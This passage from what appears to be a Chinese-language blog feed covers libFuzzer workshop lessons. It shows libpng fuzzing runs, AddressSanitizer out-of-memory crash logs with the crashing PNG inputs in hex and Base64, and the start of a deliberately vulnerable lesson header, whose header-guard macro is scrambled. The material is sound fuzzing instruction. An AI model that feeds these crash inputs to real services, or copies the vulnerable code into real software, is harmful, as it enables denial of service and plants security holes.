class="line">section_gAMA=&quot;gAMA&quot;</span><br><span class="line">section_gIFg=&quot;gIFg&quot;</span><br><span class="line">section_gIFt=&quot;gIFt&quot;</span><br><span class="line">section_gIFx=&quot;gIFx&quot;</span><br><span class="line">section_hIST=&quot;hIST&quot;</span><br><span class="line">section_iCCP=&quot;iCCP&quot;</span><br><span class="line">section_iTXt=&quot;iTXt&quot;</span><br><span class="line">section_oFFs=&quot;oFFs&quot;</span><br><span class="line">section_pCAL=&quot;pCAL&quot;</span><br><span class="line">section_pHYs=&quot;pHYs&quot;</span><br><span class="line">section_sBIT=&quot;sBIT&quot;</span><br><span class="line">section_sCAL=&quot;sCAL&quot;</span><br><span class="line">section_sPLT=&quot;sPLT&quot;</span><br><span class="line">section_sRGB=&quot;sRGB&quot;</span><br><span class="line">section_sTER=&quot;sTER&quot;</span><br><span class="line">section_tEXt=&quot;tEXt&quot;</span><br><span class="line">section_tIME=&quot;tIME&quot;</span><br><span class="line">section_tRNS=&quot;tRNS&quot;</span><br><span class="line">section_zTXt=&quot;zTXt&quot;# </span><br></pre></td></tr></table></figure><p>先不使用字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1</span><br><span class="line">Done 5454409 runs in 61 second(s)</span><br><span class="line">stat::number_of_executed_units: 5454409</span><br><span class="line">stat::average_exec_per_sec:     89416</span><br><span class="line">stat::new_units_added:          512</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              822</span><br></pre></td></tr></table></figure><p>探测到了512个代码单元<br>之后使用字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1 -dict=./png.dict</span><br><span class="line">#2849333REDUCE cov: 287 ft: 511 corp: 111/19Kb lim: 4096 exec/s: 105530 rss: 682Mb L: 43/3088 MS: 1 EraseBytes-</span><br><span class="line">#2871709REDUCE cov: 291 ft: 515 corp: 112/19Kb lim: 4096 exec/s: 106359 rss: 682Mb L: 47/3088 MS: 1 ManualDict- DE: &quot;bKGD&quot;-</span><br><span class="line">#2883416NEW    cov: 293 ft: 520 corp: 113/19Kb lim: 4096 exec/s: 106793 rss: 682Mb L: 48/3088 MS: 2 PersAutoDict-EraseBytes- DE: &quot;sPLT&quot;-</span><br><span class="line">=================================================================</span><br><span class="line">==26551==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x62474b42 bytes</span><br><span class="line">    #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</span><br><span class="line">    #1 0x5a98a3 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16</span><br><span class="line">    #2 0x5a98a3 in png_handle_sPLT /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:1683:13</span><br><span class="line">    #3 0x571b3c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:225:10</span><br><span class="line">    #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3</span><br><span class="line">    #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15</span><br><span class="line">    #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3</span><br><span class="line">    #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19</span><br><span class="line">    #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5</span><br><span class="line">    #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6</span><br><span class="line">    #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #11 0x7f5d84c2fbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line"></span><br><span class="line">==26551==HINT: if you don&#x27;t care about these errors you may set allocator_may_return_null=1</span><br><span class="line">SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc</span><br><span class="line">==26551==ABORTING</span><br><span class="line">MS: 1 ShuffleBytes-; base unit: 1c223175724dec61e3adf94affb1cceec27d30ae</span><br><span class="line">0x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x63,0x1,0x0,0x0,0x0,0x0,0x4,0x0,0x41,0x41,0x62,0x47,0x4b,0x41,0x73,0x50,0x4c,0x54,0x44,0x41,0x41,0x41,0x41,0x41,0xb9,</span><br><span class="line">\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00\x10\x00\x00\x00c\x01\x00\x00\x00\x00\x04\x00AAbGKAsPLTDAAAAA\xb9</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-ac5ad67d43ac829fd5148d6930a33c17c2ac7143</span><br><span class="line">Base64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG5</span><br><span class="line">stat::number_of_executed_units: 2888597</span><br><span class="line">stat::average_exec_per_sec:     103164</span><br><span class="line">stat::new_units_added:          533</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              682</span><br></pre></td></tr></table></figure><p>啊这，直接出crash,有点东西。这也再次说明了好的字典使得我们fuzz时的输入数据更具有针对性，当然也提高了触发更多代码单元和获得crash的可能。<br>我使用workshop的#1编译方法在使用dict的情况下cov只有40多，也未能得到crash，因此上面能得到crash也得益于我们的插桩策略。<br>在未使用语料库的情况下就得到了crash实属意料之外，如果我们在使用字典的下情况仍然暂时未得到crash，另一个方法可以去寻找一些有效的输入语料库。因为libfuzzer是进化型的fuzz，结合了产生和变异两个发面。如果我们可以提供一些好的seed，虽然它本身没法造成程序crash，但libfuzzer会在此基础上进行变异，就有可能变异出更好的语料，从而增大程序crash的概率。具体的变异策略需要我们去阅读libfuzzer的源码或者些相关的论文。<br>workshop给我们提供了一些seed：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  09 git:(master) ✗ ls seed_corpus </span><br><span class="line">anti_aliasing_perspective.png             blue_yellow_alpha.png                green.png                                  offset_background_filter_1x.png</span><br><span class="line">anti_aliasing.png                         blue_yellow_alpha_translate.png      green_small.png                            offset_background_filter_2x.png</span><br><span class="line">axis_aligned.png                          blue_yellow_anti_aliasing.png        green_small_with_blue_corner.png           rotated_drop_shadow_filter_gl.png</span><br><span class="line">background_filter_blur_off_axis.png       blue_yellow_filter_chain.png         green_with_blue_corner.png                 rotated_drop_shadow_filter_sw.png</span><br><span class="line">background_filter_blur_outsets.png        blue_yellow_flipped.png              image_mask_of_layer.png                    rotated_filter_gl.png</span><br><span class="line">background_filter_blur.png                blue_yellow_partial_flipped.png      intersecting_blue_green.png                rotated_filter_sw.png</span><br><span class="line">background_filter_on_scaled_layer_gl.png  blue_yellow.png                      intersecting_blue_green_squares.png        scaled_render_surface_layer_gl.png</span><br><span class="line">background_filter_on_scaled_layer_sw.png  blur_filter_with_clip_gl.png         intersecting_blue_green_squares_video.png  scaled_render_surface_layer_sw.png</span><br><span class="line">background_filter.png                     blur_filter_with_clip_sw.png         intersecting_light_dark_squares_video.png  spiral_64_scale.png</span><br><span class="line">background_filter_rotated_gl.png          checkers_big.png                     mask_bottom_right.png                      spiral_double_scale.png</span><br><span class="line">background_filter_rotated_sw.png          checkers.png                         mask_middle.png                            spiral.png</span><br><span class="line">black.png                                 dark_grey.png                        mask_of_background_filter.png              white.png</span><br><span class="line">blending_and_filter.png                   enlarged_texture_on_crop_offset.png  mask_of_clipped_layer.png                  wrap_mode_repeat.png</span><br><span class="line">blending_render_pass_cm.png               enlarged_texture_on_threshold.png    mask_of_layer.png                          yuv_stripes_alpha.png</span><br><span class="line">blending_render_pass_mask_cm.png          filter_with_giant_crop_rect.png      mask_of_layer_with_blend.png               yuv_stripes_clipped.png</span><br><span class="line">blending_render_pass_mask.png             force_anti_aliasing_off.png          mask_of_replica_of_clipped_layer.png       yuv_stripes_offset.png</span><br><span class="line">blending_render_pass.png                  four_blue_green_checkers_linear.png  mask_of_replica.png                        yuv_stripes.png</span><br><span class="line">blending_transparent.png                  four_blue_green_checkers.png         mask_with_replica_of_clipped_layer.png     zoom_filter_gl.png</span><br><span class="line">blending_with_root.png                    green_alpha.png                      mask_with_replica.png                      zoom_filter_sw.png</span><br></pre></td></tr></table></figure><p>使用seed_corpus去fuzz:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  09 git:(master) ✗ ./libpng_read_fuzzer seed_corpus</span><br><span class="line">#502095REDUCE cov: 626 ft: 2025 corp: 450/631Kb lim: 19944 exec/s: 4219 rss: 457Mb L: 821/19555 MS: 2 CMP-EraseBytes- DE: &quot;JDAT&quot;-</span><br><span class="line">#502951REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4226 rss: 457Mb L: 2710/19555 MS: 1 EraseBytes-</span><br><span class="line">#503447REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4230 rss: 457Mb L: 467/19555 MS: 1 EraseBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==26681==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytes</span><br><span class="line">    #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</span><br><span class="line">    #1 0x5ad493 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16</span><br><span class="line">    #2 0x5ad493 in png_handle_sCAL /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:2323:13</span><br><span class="line">    #3 0x571a4c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:200:10</span><br><span class="line">    #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3</span><br><span class="line">    #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15</span><br><span class="line">    #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3</span><br><span class="line">    #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19</span><br><span class="line">    #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5</span><br><span class="line">    #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6</span><br><span class="line">    #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #11 0x7fc8e2ee1bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line"></span><br><span class="line">==26681==HINT: if you don&#x27;t care about these errors you may set allocator_may_return_null=1</span><br><span class="line">SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc</span><br><span class="line">==26681==ABORTING</span><br><span class="line">MS: 1 ChangeByte-; base unit: 7221de698a693628dcbac00aa34b38a2aca2a905</span><br><span class="line">0x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x27,0x0,0x0,0x0,0xc8,0x8,0x2,0x0,0x0,0x0,0x22,0x3a,0x39,0xc9,0x0,0x0,0x0,0x1,0x73,0x52,0x47,0x42,0x0,0xae,0xce,0x1c,0xe9,0x0,0x0,0x0,0x9,0x70,0x48,0x59,0x73,0x0,0x0,0xb,0x13,0x0,0x0,0xb,0x13,0x1,0x0,0x9a,0x9c,0x18,0x60,0x0,0x0,0x7,0x73,0x43,0x41,0x4c,0x7,0xdd,0xed,0x4,0x14,0x33,0x74,0x49,0x0,0x0,0x0,0x0,0xb7,0xba,0x47,0x42,0x60,0x82,</span><br><span class="line">\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00&#x27;\x00\x00\x00\xc8\x08\x02\x00\x00\x00\&quot;:9\xc9\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x09pHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18`\x00\x00\x07sCAL\x07\xdd\xed\x04\x143tI\x00\x00\x00\x00\xb7\xbaGB`\x82</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-110b2ad7102489b24efc4899bf7d9e55904eb83b</span><br><span class="line">Base64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCC</span><br></pre></td></tr></table></figure><p>也顺利得到了crash，这次的crash和上面的crash有所不同，上面造成crash时的cov只有293，而且造成crash的输入为<code>Base64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG51</code>，而使用seed的话cov达到了626，而且造成crash的数据为<code>Base64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCC</code>，要长很多。<br>多数情况下我们同时使用字典和语料库，从产生和变异两个方面去提高样例的威力，双管齐下。</p><p>接下来就要分析crash的原因了：<code>ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytes</code>，怎么有点眼熟，好像和lesson 09的报错一样。。但也有所不同，它对错误定位在了<code>in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</code>，这个是底层malloc的位置，同时有个hint：<code>if you don&#39;t care about these errors you may set allocator_may_return_null=1</code>，提示我们这个crash是由于malloc申请失败造成的，也就是<code>/home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16</code>处的malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      buffer = png_voidcast(png_bytep, png_malloc_base(png_ptr, new_size));  <span class="comment">//此处的png_malloc_base</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (buffer != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         png_ptr-&gt;read_buffer = buffer;</span><br><span class="line">         png_ptr-&gt;read_buffer_size = new_size;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (warn &lt; <span class="number">2</span>) <span class="comment">/* else silent */</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (warn != <span class="number">0</span>)</span><br><span class="line">             png_chunk_warning(png_ptr, <span class="string">&quot;insufficient memory to read chunk&quot;</span>);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             png_chunk_error(png_ptr, <span class="string">&quot;insufficient memory to read chunk&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>定位到问题出在png_malloc_base(png_ptr, new_size)处，由于没有对new_size的大小进行严格限制岛主在malloc时<code>trying to allocate 0x60000008 bytes</code>导致异常崩溃。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这一篇操作下来我感觉到对于提高libfuzzer的效率包括在编译插桩、字典使用、语料库选择方面有了更清楚的认识。模糊测试fuzz在软件诞生时就应运而生了，经过了如此长时间的发展，对人们它的研究也在不断深入，并且根据不同的需求开发出了很多个性化的fuzz工具。正所谓理论结合实践，要想对libfuzzer有更深入的了解，我们还是要去分析它的源码，参考各种研究paper。</p><p>初学libfuzzer，有错误疏忽之处烦请各位师傅指正。</p>]]></content>
      
      
      
        <tags>
            
            <tag> FUZZ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（转）LibFuzzer workshop学习之路（一）</title>
      <link href="/2020/12/17/LibFuzzer(1)/"/>
      <url>/2020/12/17/LibFuzzer(1)/</url>
      
        <content type="html"><![CDATA[<p>文章首发于安全客，由安全客原创发布：<a href="https://www.anquanke.com/post/id/224823">https://www.anquanke.com/post/id/224823</a></p><h3 id="LibFuzzer-workshop学习之路（一）"><a href="#LibFuzzer-workshop学习之路（一）" class="headerlink" title="LibFuzzer workshop学习之路（一）"></a>LibFuzzer workshop学习之路（一）</h3><blockquote><p>最近做项目开始上手学习libfuzzer，是跟着libfuzzer-workshop学的。写下自己的心得和收获。</p></blockquote><span id="more"></span><p>官方给出的定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LibFuzzer is in-process, coverage-guided, evolutionary fuzzing engine.</span><br><span class="line">LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka “target function”); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage. The code coverage information for libFuzzer is provided by LLVM’s SanitizerCoverage instrumentation.</span><br></pre></td></tr></table></figure><p>简单来说就是通过与要进行fuzz的库连接，并将libfuzzer生成的输入通过模糊测试进入点(fuzz target)喂给要fuzz的库进行fuzz testing。同时fuzzer会跟踪哪些区域的代码已经被测试过的，并且根据种料库的输入进行变异来使得代码覆盖率最大化。代码覆盖率的信息是由LLVM’s SanitizerCoverage插桩提供的</p><p>需要注意的是这几个libfuzzer的特性：in-process指进程内。即libfuzzer在fuzz时并不是产生出多个进程来分别处理不同的输入，而是将所有的测试数据放入进程的内存空间中。coverage-guided指覆盖率指导的。即会进行代码覆盖率的计算，正如定义所说的使得不断增大代码覆盖率。evolutionary是指libfuzzer是进化型的fuzz，结合了产生和变异两种形式。</p><h4 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h4><p>跟着<a href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a> 搭建就好了，主要是build llvm的环境可能要make一会儿。编译好后拿到libfuzzer.a(静态链接库文件)，就可以开始上手实践了。</p><h4 id="fuzz-testing"><a href="#fuzz-testing" class="headerlink" title="fuzz testing"></a>fuzz testing</h4><p>libfuzzer已经提供了数据样本生成和异常检测功能，我们要做的就是要实现模糊测试进入点(fuzz target)，将libfuzzer生成的数据交给目标程序处理。<br>fuzz target编写模板：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  DoSomethingInterestingWithMyAPI(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是<code>LLVMFuzzerTestOneInput</code>函数即使我们要实现的接口函数，他的两个参数Data(libfuzzer的测试样本数据)，size(样本数据的大小)。<br><code>DoSomethingInterestingWithMyAPI</code>函数即我们实际要进行fuzz的函数。</p><h5 id="编译-cc文件："><a href="#编译-cc文件：" class="headerlink" title="编译.cc文件："></a>编译.cc文件：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clang++ -g -O1 -fsanitize=fuzzer,address \</span><br><span class="line">fuzz_target.cc ../../libFuzzer/Fuzzer/libFuzzer.a \</span><br><span class="line">-o fuzzer_target</span><br></pre></td></tr></table></figure><p>几个参数：<br>-g 可选参数，保留调试符号。<br>-O1 指定优化等级为1<br>-fsanitize 指定sanitize。<br>fuzzer是必须的，用来启用libfuzzer。还可以附加的其他sanitize有：address(用来检测内存访问相关的错误，如stack_overflow,heap_overflow,uaf,可以与fuzzer一起使用)；memory(检测未初始化内存的访问，应单独使用)；undefined(检测其他的漏洞，如整数溢出，类型混淆等未定义的漏洞)<br>注：-fsanitize-coverage&#x3D;trace-pc-guard选项在高版本的clang中已不再适用，代码的覆盖率情况默认自动开启。</p><p>这一步骤整体过程就是通过clang的-fsanitize&#x3D;fuzzer选项可以启用libFuzzer，这个选项在编译和链接过程中生效，实现了条件判断语句和分支执行的记录，并且辅以libFuzzer中的库函数(libfuzzer.a)，通过生成不同的测试样例然后能够获得代码的覆盖率情况，最终实现所谓的fuzz testing。</p><h5 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h5><h6 id="先来lesson-04，要测试的库是vulnerable-functions-h："><a href="#先来lesson-04，要测试的库是vulnerable-functions-h：" class="headerlink" title="先来lesson 04，要测试的库是vulnerable_functions.h："></a>先来lesson 04，要测试的库是vulnerable_functions.h：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LESSLE_FONS_04_VULNERABUNCTIONS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction1</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= <span class="number">3</span>) &#123;</span><br><span 